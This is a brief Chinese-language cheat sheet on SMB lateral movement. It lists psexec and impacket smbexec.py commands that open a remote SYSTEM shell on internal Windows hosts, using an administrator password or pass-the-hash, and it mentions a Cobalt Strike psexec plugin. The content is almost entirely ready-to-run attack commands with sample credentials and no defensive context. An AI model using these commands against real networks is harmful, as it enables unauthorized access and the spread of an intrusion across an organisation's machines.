# SMB移动
1.psexec
```
windows官方工具
交互式
psexec \\192.168.3.32 -u administrator -p admin!@#45 -s cmd

psexec -hashes :(.....) sqlserver/administrator@192.168.130
```
2.smbexec-impacket
```
smbexec.py sqlserver/administrator:admin!@#45@192.168.130

smbexec.py -hashes :(.....) sqlserver/administrator@192.168.130
```
3.CS-psexec插件
